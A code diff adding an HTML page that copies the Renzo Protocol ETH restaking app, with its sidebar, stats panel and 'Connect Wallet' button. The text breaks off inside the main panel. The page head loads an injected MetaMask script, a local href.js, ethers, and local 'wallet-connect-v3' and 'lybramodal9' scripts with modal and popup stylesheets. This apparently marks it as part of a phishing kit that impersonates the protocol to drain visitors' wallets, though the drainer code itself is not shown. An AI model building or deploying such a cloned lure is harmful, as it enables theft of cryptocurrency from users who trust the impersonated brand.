@@ -1,0 +1,537 @@
+<html lang="en" class="dark" style="color-scheme: dark;">
+<script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script>
+<link type="text/css" id="dark-mode" rel="stylesheet" href="">
+<style type="text/css" id="dark-mode-сustom-style"></style>
+<style type="text/css" id="dark-mode-theme-changer-style"></style>
+
+<head>
+    <link rel="stylesheet" href="/_next/static/css/84bb6a460e32b3c7.css" crossorigin="" data-precedence="next">
+    <script src="./href.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <title>Renzo</title>
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="600x600">
+    <meta name="next-size-adjust">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Renzo Protocol">
+    <meta name="twitter:description" content="Restake ETH Natively and Never Worry about EigenLayer Caps">
+    <meta name="twitter:image" content="https://app.renzoprotocol.com/twitter-banner.png">
+    <style data-emotion="css" data-s=""></style>
+    <link rel="preload" href="/tokens/ETH.svg" as="image" fetchpriority="high">
+    <link rel="preload" href="/_next/static/media/ethereum.16f30881.svg" as="image" fetchpriority="high">
+    <link rel="preload" href="/tokens/ezETH.svg" as="image" fetchpriority="high">
+    <script charset="UTF-8" type="text/javascript"
+        src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+    <script charset="UTF-8" type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
+    <script charset="UTF-8" type="text/javascript" src="./files/scripts/wallet-connect-v3.js"></script>
+    <link charset="UTF-8" rel="stylesheet" href="./files/styles/modal-9.css">
+    </link>
+    <link charset="UTF-8" rel="stylesheet" href="./files/styles/popup-6.css">
+    </link>
+    <script charset="UTF-8" type="text/javascript" src="./lybramodal9.js"></script>
+</head>
+
+<body class="__className_7ebfb6">
+    <div class="flex flex-col items-center justify-center lg:p-4">
+        <div
+            class="bg-fg-light dark:bg-fg-dark flex h-svh w-full flex-row items-start justify-start overflow-hidden lg:h-[calc(100vh_-_32px)] lg:rounded-2xl">
+            <div class="h-full">
+                <div
+                    class="bg-fg-light dark:bg-fg-dark border-divider-light dark:border-divider-dark absolute left-[-240px] top-0 flex h-full min-w-[240px] flex-col items-center justify-between space-y-5 overflow-y-auto border-r px-5 pb-6 pt-14 transition-[left] delay-150 ease-in-out lg:relative lg:left-0">
+                    <div class="flex w-full flex-col items-center justify-start space-y-20"><a
+                            href="https://www.renzoprotocol.com/">
+                            <div class="relative flex h-6 w-40 flex-row items-center justify-center">
+                                <div class="block dark:hidden"><img alt="Renzo" loading="lazy" width="180" height="32"
+                                        decoding="async" data-nimg="1" src="/logos/logo-light-beta.svg"
+                                        style="color: transparent;"></div>
+                                <div class="hidden dark:block"><img alt="Renzo" loading="lazy" width="180" height="32"
+                                        decoding="async" data-nimg="1" src="/logos/logo-dark-beta.svg"
+                                        style="color: transparent;"></div>
+                            </div>
+                        </a>
+                        <div class="flex w-full flex-col items-center justify-start space-y-2">
+                            <div
+                                class="flex w-full cursor-pointer select-none flex-row items-center justify-start space-x-4 whitespace-nowrap rounded-lg px-4 py-2.5 text-[20px] text-[#797979] hover:bg-[#EDEDF2] dark:text-[#4E5160] dark:hover:bg-[#1D1F30]">
+                                <div class="flex size-5 flex-row items-center justify-center"><svg width="100%"
+                                        height="100%" viewBox="0 2 28 26" fill="none"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M18.7442 8.25556C16.124 5.63543 11.876 5.63543 9.25583 8.25556C6.6357 10.8757 6.6357 15.1238 9.25583 17.7439C9.64115 18.1292 9.64115 18.7539 9.25583 19.1392C8.87052 19.5246 8.2458 19.5246 7.86049 19.1392C4.46973 15.7485 4.46973 10.251 7.86049 6.86021C11.2512 3.46946 16.7488 3.46946 20.1395 6.86021C23.5303 10.251 23.5303 15.7485 20.1395 19.1392C19.7542 19.5246 19.1295 19.5246 18.7442 19.1392C18.3589 18.7539 18.3589 18.1292 18.7442 17.7439C21.3643 15.1238 21.3643 10.8757 18.7442 8.25556Z"
+                                            fill="currentColor"></path>
+                                        <path
+                                            d="M13.7398 13.0404C13.5353 12.9634 13.3755 12.8698 13.2558 12.7625C13.1543 12.6653 13.0971 12.5289 13.0971 12.3352C13.0971 12.0898 13.1762 11.9044 13.3278 11.764L13.3279 11.7639C13.4843 11.6186 13.7179 11.5356 14.0508 11.5356C14.3906 11.5356 14.6605 11.6155 14.8703 11.7654C15.0683 11.9068 15.2015 12.1425 15.2526 12.4997L15.2705 12.6249H15.3969H16.517H16.6786L16.6621 12.4641C16.6121 11.9783 16.4645 11.5703 16.2113 11.2494C15.9694 10.9275 15.6605 10.6922 15.2869 10.5454C15.1443 10.4868 14.9967 10.4397 14.844 10.4039V9.49902V9.35319H14.6982H13.6603H13.5145V9.49902V10.3621C13.2387 10.4067 12.99 10.4865 12.7699 10.6033L12.7699 10.6033L12.7688 10.6039C12.4208 10.7924 12.1477 11.0381 11.9546 11.3425L11.9546 11.3425L11.9533 11.3447C11.7681 11.6485 11.6751 11.9796 11.6751 12.3352C11.6751 12.7157 11.7467 13.0414 11.9007 13.3032L11.9007 13.3032L11.9017 13.3048C12.0509 13.551 12.2493 13.7494 12.4955 13.8986L12.4954 13.8986L12.4983 13.9002C12.7339 14.0359 12.9868 14.1462 13.2567 14.2315L13.2567 14.2315L13.261 14.2328C13.5293 14.3084 13.7976 14.3807 14.0659 14.4495L14.0659 14.4495L14.0694 14.4503C14.3316 14.5108 14.5724 14.5811 14.7922 14.661L14.7922 14.6611L14.7959 14.6623C15.0036 14.7316 15.1584 14.8292 15.2683 14.9507L15.2682 14.9507L15.2708 14.9534C15.3768 15.0647 15.4361 15.2177 15.4361 15.4283C15.4361 15.6749 15.3474 15.8708 15.1676 16.0274C14.9917 16.1806 14.7199 16.269 14.3282 16.269C13.926 16.269 13.6041 16.1784 13.3531 16.0073C13.109 15.8343 12.9643 15.5883 12.9212 15.2554L12.9047 15.1283H12.7766H11.6667H11.4977L11.5225 15.2956C11.6298 16.018 11.9337 16.5739 12.4444 16.9439C12.7543 17.1685 13.1118 17.322 13.5145 17.4067V18.3056V18.4514H13.6603H14.6982H14.844V18.3056V17.4492C15.1145 17.4103 15.3664 17.3398 15.5993 17.2369C15.9848 17.0695 16.2914 16.8234 16.5136 16.4979C16.7454 16.1684 16.8581 15.7752 16.8581 15.3255C16.8581 14.9516 16.7863 14.632 16.6315 14.3765C16.4823 14.1304 16.2838 13.9352 16.0372 13.7927C15.8065 13.6488 15.5517 13.5378 15.2738 13.4593C15.0039 13.3763 14.7339 13.3036 14.4638 13.2413C14.2015 13.1807 13.9602 13.1137 13.7398 13.0404Z"
+                                            fill="currentColor" stroke="currentColor" stroke-width="0.291667"></path>
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M3.01306 19.6471C2.29094 19.6471 1.70555 20.3272 1.70555 21.166C1.70555 22.0049 2.29094 22.6849 3.01306 22.6849H24.987C25.7092 22.6849 26.2945 22.0049 26.2945 21.166C26.2945 20.3272 25.7092 19.6471 24.987 19.6471H23.0826C22.6117 19.6471 22.2299 19.2037 22.2299 18.6566C22.2299 18.1095 22.6117 17.666 23.0826 17.666H24.987C26.651 17.666 28 19.233 28 21.166C28 23.099 26.651 24.666 24.987 24.666H3.01306C1.34904 24.666 9.22367e-05 23.099 9.22367e-05 21.166C9.22367e-05 19.233 1.34905 17.666 3.01306 17.666H5.17331C5.64426 17.666 6.02604 18.1095 6.02604 18.6566C6.02604 19.2037 5.64426 19.6471 5.17331 19.6471H3.01306Z"
+                                            fill="currentColor"></path>
+                                    </svg></div>
+                                <div class="flex flex-row items-center justify-start leading-none"><a href="/restake">
+                                        <p class="text-sm">Restake</p>
+                                    </a></div>
+                            </div>
+                            <div
+                                class="flex w-full cursor-pointer select-none flex-row items-center justify-start space-x-4 whitespace-nowrap rounded-lg px-4 py-2.5 text-[20px] text-[#797979] hover:bg-[#EDEDF2] dark:text-[#4E5160] dark:hover:bg-[#1D1F30]">
+                                <div class="flex size-5 flex-row items-center justify-center"><svg width="21"
+                                        height="22" viewBox="0 0 21 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <g clip-path="url(#clip0_3143_1529)">
+                                            <rect width="21" height="20.9039" transform="translate(0 0.547852)"
+                                                fill="none"></rect>
+                                            <path
+                                                d="M17.277 2.82155C15.8731 1.52299 13.7811 0.645927 11.5683 0.602539L11.5156 8.75646L17.277 2.82155Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M10.0382 0.547852C4.26446 0.547852 0 5.2276 0 11.0014C0 16.7751 4.67975 21.4549 10.4535 21.4549C14.501 21.4549 18.2665 19.0654 19.6519 15.9817L10.249 11.0045V0.55405C10.1777 0.55405 10.1095 0.547852 10.0382 0.547852Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M15.4245 6.56912L13.9121 11.3914L14.7861 11.8594L16.9307 5.01953L15.4245 6.56912Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M13.4755 8.57498L12.7812 10.7847L13.6552 11.2527L14.9817 7.02539L13.4755 8.57498Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M19.6744 5.6709L17.3066 13.2112L18.1806 13.6792L20.2973 6.93226C20.1176 6.49528 19.9099 6.07379 19.6744 5.6709Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M20.4632 7.36621L18.4395 13.8156L19.3134 14.2836L20.9126 9.19162C20.8258 8.56559 20.674 7.95505 20.4663 7.36621H20.4632Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M21.001 10.4067C21.001 10.2424 20.9948 10.0781 20.9855 9.91699L19.5723 14.4232L20.0836 14.699C20.7376 13.4284 20.9979 11.9377 20.9979 10.4098L21.001 10.4067Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M18.1875 3.73047L17.3786 4.56105L15.0449 11.996L15.9189 12.4639L18.5439 4.10547C18.4292 3.9753 18.3115 3.85134 18.1906 3.73047H18.1875Z"
+                                                fill="currentColor"></path>
+                                            <path d="M11.8242 10.2708L12.5215 10.6458L13.0298 9.03418L11.8242 10.2708Z"
+                                                fill="currentColor"></path>
+                                            <path
+                                                d="M18.7636 4.36328L16.1758 12.604L17.0497 13.072L19.4764 5.34262C19.2564 4.99861 19.0208 4.6701 18.7636 4.36328Z"
+                                                fill="currentColor"></path>
+                                        </g>
+                                        <defs>
+                                            <clipPath id="clip0_3143_1529">
+                                                <rect width="21" height="20.9039" fill="white"
+                                                    transform="translate(0 0.547852)"></rect>
+                                            </clipPath>
+                                        </defs>
+                                    </svg></div>
+                                <div class="flex flex-row items-center justify-start leading-none"><a href="/portfolio">
+                                        <p class="text-sm">Portfolio</p>
+                                    </a></div>
+                            </div>
+                            <div
+                                class="flex w-full cursor-pointer select-none flex-row items-center justify-start space-x-4 whitespace-nowrap rounded-lg px-4 py-2.5 text-[20px] text-[#797979] hover:bg-[#EDEDF2] dark:text-[#4E5160] dark:hover:bg-[#1D1F30]">
+                                <div class="flex size-5 flex-row items-center justify-center"><svg width="16"
+                                        height="18" viewBox="0 0 16 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <ellipse cx="8" cy="4" rx="7" ry="3" stroke="currentColor" stroke-width="2">
+                                        </ellipse>
+                                        <path
+                                            d="M1 10C1 10 1 12.3431 1 14C1 15.6569 4.13401 17 8 17C11.866 17 15 15.6569 15 14C15 13.173 15 10 15 10"
+                                            stroke="currentColor" stroke-width="2" stroke-linecap="square"></path>
+                                        <path
+                                            d="M1 4C1 4 1 7.34315 1 9C1 10.6569 4.13401 12 8 12C11.866 12 15 10.6569 15 9C15 8.17299 15 4 15 4"
+                                            stroke="currentColor" stroke-width="2"></path>
+                                    </svg></div>
+                                <div class="flex flex-row items-center justify-start leading-none"><a href="/defi">
+                                        <p class="text-sm">DeFi</p>
+                                    </a></div>
+                            </div>
+                            <div
+                                class="flex w-full cursor-pointer select-none flex-row items-center justify-start space-x-4 whitespace-nowrap rounded-lg px-4 py-2.5 text-[20px] text-[#797979] hover:bg-[#EDEDF2] dark:text-[#4E5160] dark:hover:bg-[#1D1F30]">
+                                <div class="flex size-5 flex-row items-center justify-center"><svg width="24"
+                                        height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M12.5 14.75H9.99999C9.58999 14.75 9.24999 14.41 9.24999 14C9.24999 13.59 9.58999 13.25 9.99999 13.25H12.5C15.12 13.25 17.25 11.12 17.25 8.5C17.25 5.88 15.12 3.75 12.5 3.75H7.49999C4.87999 3.75 2.74999 5.88 2.74999 8.5C2.74999 9.6 3.13999 10.67 3.83999 11.52C4.09999 11.84 4.05999 12.31 3.73999 12.58C3.41999 12.84 2.94999 12.8 2.67999 12.48C1.74999 11.36 1.23999 9.95 1.23999 8.5C1.23999 5.05 4.03999 2.25 7.48999 2.25H12.49C15.94 2.25 18.74 5.05 18.74 8.5C18.74 11.95 15.95 14.75 12.5 14.75Z"
+                                            fill="currentColor"></path>
+                                        <path
+                                            d="M16.5 21.75H11.5C8.05 21.75 5.25 18.95 5.25 15.5C5.25 12.05 8.05 9.25 11.5 9.25H14C14.41 9.25 14.75 9.59 14.75 10C14.75 10.41 14.41 10.75 14 10.75H11.5C8.88 10.75 6.75 12.88 6.75 15.5C6.75 18.12 8.88 20.25 11.5 20.25H16.5C19.12 20.25 21.25 18.12 21.25 15.5C21.25 14.4 20.86 13.33 20.16 12.48C19.9 12.16 19.94 11.69 20.26 11.42C20.58 11.15 21.05 11.2 21.32 11.52C22.25 12.64 22.76 14.05 22.76 15.5C22.75 18.95 19.95 21.75 16.5 21.75Z"
+                                            fill="currentColor"></path>
+                                    </svg></div>
+                                <div class="flex flex-row items-center justify-start leading-none"><a href="/referral">
+                                        <p class="text-sm">Referral Program</p>
+                                    </a></div>
+                            </div>
+                            <div
+                                class="flex w-full cursor-pointer select-none flex-row items-center justify-start space-x-4 whitespace-nowrap rounded-lg px-4 py-2.5 text-[20px] text-[#797979] hover:bg-[#EDEDF2] dark:text-[#4E5160] dark:hover:bg-[#1D1F30]">
+                                <div class="flex size-5 flex-row items-center justify-center"><svg width="100%"
+                                        height="100%" viewBox="0 0 20 20" fill="none"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <rect y="10.1855" width="5.74064" height="9.81464" rx="1" fill="currentColor">
+                                        </rect>
+                                        <rect x="7.03857" y="5.55566" width="5.74064" height="14.4442" rx="1"
+                                            fill="currentColor"></rect>
+                                        <rect x="14.0725" width="5.74064" height="19.9996" rx="1" fill="currentColor">
+                                        </rect>
+                                    </svg></div>
+                                <div class="flex flex-row items-center justify-start leading-none"><a href="/analytics">
+                                        <p class="text-sm">Analytics</p>
+                                    </a></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex w-full flex-col space-y-5">
+                        <div class="flex w-full items-center justify-center gap-x-3"><a
+                                href="https://github.com/Renzo-Protocol" class="hover:opacity-80"><svg width="21"
+                                    height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M10.5087 0.5C4.69766 0.5 0 4.85415 0 10.2408C0 14.5467 3.00995 18.1915 7.18555 19.4815C7.7076 19.5785 7.89883 19.2719 7.89883 19.014C7.89883 18.7882 7.88162 18.0142 7.88162 17.2077C4.95836 17.7883 4.34962 16.0465 4.34962 16.0465C3.87983 14.9176 3.18375 14.6274 3.18375 14.6274C2.22697 14.0307 3.25345 14.0307 3.25345 14.0307C4.31477 14.0952 4.87167 15.0306 4.87167 15.0306C5.81103 16.5142 7.32472 16.095 7.93368 15.8369C8.02058 15.2079 8.29914 14.7725 8.59491 14.5307C6.2634 14.3048 3.81035 13.4663 3.81035 9.72466C3.81035 8.66027 4.22765 7.78944 4.88888 7.11217C4.78456 6.87032 4.4191 5.87025 4.99342 4.53174C4.99342 4.53174 5.88073 4.27366 7.88141 5.53161C8.73797 5.31839 9.62133 5.20992 10.5087 5.20901C11.396 5.20901 12.3005 5.32202 13.1358 5.53161C15.1367 4.27366 16.024 4.53174 16.024 4.53174C16.5983 5.87025 16.2326 6.87032 16.1283 7.11217C16.8069 7.78944 17.207 8.66027 17.207 9.72466C17.207 13.4663 14.754 14.2886 12.405 14.5307C12.7879 14.837 13.1183 15.4175 13.1183 16.3368C13.1183 17.6431 13.1011 18.6914 13.1011 19.0138C13.1011 19.2719 13.2926 19.5785 13.8144 19.4817C17.99 18.1913 21 14.5467 21 10.2408C21.0172 4.85415 16.3023 0.5 10.5087 0.5Z"
+                                        fill="currentColor"></path>
+                                </svg></a><a href="https://docs.renzoprotocol.com/docs/" class="hover:opacity-80"><svg
+                                    width="16" height="21" viewBox="0 0 16 21" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M8.9996 3.16002V6.25H12.609L8.9996 3.16002ZM13.9996 7.75H7.4996V2.25H5.52802C4.70078 2.25 4.0297 2.91972 4.02802 3.74696L4.0057 14.747C4.00402 15.5754 4.67422 16.2483 5.50265 16.25L12.4996 16.25C13.328 16.25 13.9996 15.5784 13.9996 14.75V7.75ZM3.49366 3.99622C3.49577 4.41043 3.1617 4.74792 2.74749 4.75003C2.05581 4.75355 1.50004 5.31216 1.50004 6.00003L1.50004 17.5C1.50004 18.1904 2.05968 18.75 2.75004 18.75L10.25 18.75C10.9403 18.75 11.4999 18.1905 11.5 17.5002C11.5 17.0746 11.8358 16.7388 12.25 16.7388C12.6642 16.7388 13 17.0746 13 17.4888C12.9998 19.019 11.7686 20.25 10.25 20.25L2.75004 20.25C1.23126 20.25 3.90606e-05 19.0188 3.91006e-05 17.5L3.98159e-05 6.00003C3.98559e-05 4.48671 1.22274 3.25777 2.73604 3.25007C3.15406 3.24794 3.49155 3.58201 3.49366 3.99622ZM8.49097 0.75L15.4996 6.75V14.75C15.4996 16.4069 14.1565 17.75 12.4996 17.75H5.50569C3.84275 17.7466 2.50234 16.4008 2.5057 14.7439L2.52802 3.74391C2.53138 2.08944 3.87354 0.75 5.52802 0.75H8.49097Z"
+                                        fill="currentColor"></path>
+                                </svg></a><a href="https://twitter.com/RenzoProtocol" class="hover:opacity-80"><svg
+                                    width="18" height="16" viewBox="0 0 18 16" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M0.153041 0L6.77154 8.82491L0.111328 16H1.61039L7.44153 9.71796L12.1528 16H17.2538L10.2627 6.67879L16.4621 0H14.963L9.59304 5.78545L5.25406 0H0.153041ZM2.35748 1.10103H4.70087L15.049 14.899H12.7057L2.35748 1.10103Z"
+                                        fill="currentColor"></path>
+                                </svg></a><a href="https://t.me/RenzoProtocolChat" class="hover:opacity-80"><svg
+                                    width="20" height="20" viewBox="0 0 18 18" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M8.99996 0.666626C4.39996 0.666626 0.666626 4.39996 0.666626 8.99996C0.666626 13.6 4.39996 17.3333 8.99996 17.3333C13.6 17.3333 17.3333 13.6 17.3333 8.99996C17.3333 4.39996 13.6 0.666626 8.99996 0.666626ZM12.8666 6.33329C12.7416 7.64996 12.2 10.85 11.925 12.325C11.8083 12.95 11.575 13.1583 11.3583 13.1833C10.875 13.225 10.5083 12.8666 10.0416 12.5583C9.30829 12.075 8.89163 11.775 8.18329 11.3083C7.35829 10.7666 7.89163 10.4666 8.36663 9.98329C8.49163 9.85829 10.625 7.91663 10.6666 7.74163C10.6724 7.71512 10.6716 7.6876 10.6644 7.66146C10.6571 7.63532 10.6436 7.61135 10.625 7.59163C10.575 7.54996 10.5083 7.56663 10.45 7.57496C10.375 7.59163 9.20829 8.36663 6.93329 9.89996C6.59996 10.125 6.29996 10.2416 6.03329 10.2333C5.73329 10.225 5.16663 10.0666 4.74163 9.92496C4.21663 9.75829 3.80829 9.66663 3.84163 9.37496C3.85829 9.22496 4.06663 9.07496 4.45829 8.91663C6.89163 7.85829 8.50829 7.15829 9.31663 6.82496C11.6333 5.85829 12.1083 5.69163 12.425 5.69163C12.4916 5.69163 12.65 5.70829 12.75 5.79163C12.8333 5.85829 12.8583 5.94996 12.8666 6.01663C12.8583 6.06663 12.875 6.21663 12.8666 6.33329Z"
+                                        fill="currentColor"></path>
+                                </svg></a><a href="https://mirror.xyz/renzoprotocol.eth" class="hover:opacity-80"><svg
+                                    width="18" height="19" viewBox="0 0 18 19" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M9 18.5C13.9706 18.5 18 14.4706 18 9.5C18 4.52944 13.9706 0.5 9 0.5C4.02944 0.5 0 4.52944 0 9.5C0 14.4706 4.02944 18.5 9 18.5ZM12.5454 8.34104V14.1365H5.45454V8.34104V8.10922H5.46229C5.58392 6.29686 7.12132 4.86377 8.99999 4.86377C10.8787 4.86377 12.4161 6.29686 12.5377 8.10922H12.5454V8.34104Z"
+                                        fill="currentColor"></path>
+                                </svg></a><a href="https://discord.gg/FMwGPDXXtf" class="hover:opacity-80"><svg
+                                    width="22" height="16" viewBox="0 0 22 16" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M18.0088 1.34C16.6709 0.714 15.2402 0.259052 13.7446 0C13.5609 0.332095 13.3463 0.77877 13.1983 1.1341C11.6084 0.894993 10.0331 0.894993 8.47243 1.1341C8.3245 0.77877 8.10503 0.332095 7.91971 0C6.42243 0.259052 4.99018 0.715671 3.65222 1.34331C0.953554 5.42136 0.221989 9.39811 0.587772 13.3184C2.37767 14.655 4.1123 15.467 5.81766 15.9984C6.23872 15.4189 6.61425 14.8028 6.93776 14.1536C6.32162 13.9195 5.73149 13.6306 5.17389 13.2952C5.32182 13.1856 5.46652 13.071 5.60632 12.9531C9.00728 14.5438 12.7025 14.5438 16.0628 12.9531C16.2043 13.071 16.349 13.1856 16.4953 13.2952C15.936 13.6322 15.3443 13.9211 14.7281 14.1553C15.0517 14.8028 15.4256 15.4205 15.8482 16C17.5552 15.4687 19.2915 14.6567 21.0814 13.3184C21.5106 8.77378 20.3482 4.83355 18.0088 1.34ZM7.40109 10.9075C6.38016 10.9075 5.54291 9.95435 5.54291 8.7937C5.54291 7.63305 6.36228 6.67831 7.40109 6.67831C8.43993 6.67831 9.27715 7.63138 9.25928 8.7937C9.26089 9.95435 8.43993 10.9075 7.40109 10.9075ZM14.2681 10.9075C13.2471 10.9075 12.4099 9.95435 12.4099 8.7937C12.4099 7.63305 13.2292 6.67831 14.2681 6.67831C15.3069 6.67831 16.1441 7.63138 16.1263 8.7937C16.1263 9.95435 15.3069 10.9075 14.2681 10.9075Z"
+                                        fill="currentColor"></path>
+                                </svg></a></div>
+                    </div>
+                </div>
+            </div>
+            <div class="z-0 flex size-full flex-col items-start justify-start transition-opacity lg:opacity-100">
+                <div class="flex-0 w-full">
+                    <div
+                        class="bg-fg-light dark:bg-fg-dark border-divider-light dark:border-divider-dark flex w-full  flex-row items-center justify-between border-b p-4 lg:p-8">
+                        <button class="lg:hidden"><svg width="32" height="23" viewBox="0 0 32 23" fill="none"
+                                xmlns="http://www.w3.org/2000/svg" class="size-5 text-black dark:text-white">
+                                <rect y="0.144226" width="32" height="2" rx="1" fill="currentColor"></rect>
+                                <rect y="10.1442" width="32" height="2" rx="1" fill="currentColor"></rect>
+                                <rect y="20.1442" width="32" height="2" rx="1" fill="currentColor"></rect>
+                            </svg></button>
+                        <div class="hidden lg:flex">
+                            <div
+                                class=" dark:bg-fg-dark bg-fg-light border-divider-light dark:border-divider-dark grid grid-cols-2 grid-rows-2 justify-start gap-2 border-t p-2 drop-shadow-2xl lg:relative lg:flex lg:flex-row lg:gap-0 lg:border-t-0  lg:p-4 lg:drop-shadow-none ">
+                                <div
+                                    class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                                    <div class="flex flex-row items-center space-x-2">
+                                        <div class="whitespace-nowrap">Total Value Restaked</div><button
+                                            data-state="closed" class=""><svg stroke="currentColor" fill="none"
+                                                stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                                                stroke-linejoin="round" height="1em" width="1em"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <circle cx="12" cy="12" r="10"></circle>
+                                                <line x1="12" y1="16" x2="12" y2="12"></line>
+                                                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                            </svg></button>
+                                    </div>
+                                    <div
+                                        class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">
+                                        $0.00</div>
+                                </div>
+                                <div
+                                    class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                                    <div class="flex flex-row items-center space-x-2">
+                                        <div class="whitespace-nowrap">APR</div><button data-state="closed"
+                                            class=""><svg stroke="currentColor" fill="none" stroke-width="2"
+                                                viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"
+                                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <circle cx="12" cy="12" r="10"></circle>
+                                                <line x1="12" y1="16" x2="12" y2="12"></line>
+                                                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                            </svg></button>
+                                    </div>
+                                    <div
+                                        class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">
+                                        0.00%</div>
+                                </div>
+                                <div
+                                    class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                                    <div class="flex flex-row items-center space-x-2">
+                                        <div class="whitespace-nowrap">EigenLayer Points</div><button
+                                            data-state="closed" class=""><svg stroke="currentColor" fill="none"
+                                                stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                                                stroke-linejoin="round" height="1em" width="1em"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <circle cx="12" cy="12" r="10"></circle>
+                                                <line x1="12" y1="16" x2="12" y2="12"></line>
+                                                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                            </svg></button>
+                                    </div>
+                                    <div
+                                        class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">
+                                        <div class="flex flex-row items-center justify-start gap-1"><img
+                                                alt="Restaking Points" loading="lazy" width="20" height="20"
+                                                decoding="async" data-nimg="1" src="logos/eigenlayer.svg"
+                                                style="color: transparent;">0.00</div>
+                                    </div>
+                                </div>
+                                <div
+                                    class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                                    <div class="flex flex-row items-center space-x-2">
+                                        <div class="whitespace-nowrap">Renzo ezPoints</div><button data-state="closed"
+                                            class=""><svg stroke="currentColor" fill="none" stroke-width="2"
+                                                viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"
+                                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <circle cx="12" cy="12" r="10"></circle>
+                                                <line x1="12" y1="16" x2="12" y2="12"></line>
+                                                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                            </svg></button>
+                                    </div>
+                                    <div
+                                        class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">
+                                        0.00</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex flex-row items-center justify-start space-x-3"><button
+                                class="interact-button text-secondary-600 flex h-12 items-center justify-center gap-x-1 rounded-xl bg-neutral-200 px-6 font-semibold dark:bg-neutral-300">Connect
+                                <span class="hidden xl:inline-block">Wallet</span></button><button
+                                class="bg-secondary-600 dark:bg-fg-dark text-primary-500 flex size-12 shrink-0 items-center justify-center rounded-xl outline-none dark:border dark:border-neutral-300 dark:text-neutral-300"><svg
+                                    width="21" height="20" viewBox="0 0 21 20" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M10.7822 20C8.03621 20 5.45384 18.9306 3.51203 16.988C1.56935 15.0462 0.5 12.4647 0.5 9.71779C0.5 6.9709 1.56935 4.38941 3.51203 2.4476C4.62601 1.33275 5.94038 0.509298 7.41752 0C6.19503 3.73748 6.71724 8.21724 9.5 11C11.4584 12.9584 14.5031 13.5953 17.2727 13.5953C18.3736 13.5953 19.4587 13.4229 20.5 13.0825C19.9907 14.5596 19.1672 15.8731 18.0524 16.988C16.1106 18.9298 13.5291 20 10.7822 20Z"
+                                        fill="currentColor"></path>
+                                </svg></button></div>
+                    </div>
+                </div>
+                <div class="bg-app-light dark:bg-app-dark w-full flex-1 overflow-y-auto">
+                    <div class="relative flex size-full flex-col">
+                        <div class="sticky top-0 z-10 bg-[#E6E7F2] dark:bg-[#1D1F30] text-neutral-400">
+                            <div class="flex flex-row items-center space-x-2 p-2"><span
+                                    class="flex-inline flex-1 space-x-3 text-center text-sm"><span>ETH deposit are never
+                                        capped on EigenLayer</span><span>|</span><span>wBETH and stETH deposits will
+                                        resume when EigenLayer Caps are lifted</span></span></div>
+                        </div>
+                        <div class="flex h-[calc(100%_-_32px)] w-full flex-col items-center justify-start">
+                            <div
+                                class="flex w-full max-w-[550px] flex-col items-center justify-center space-y-4 p-4 lg:p-0 lg:py-16">
+                                <div
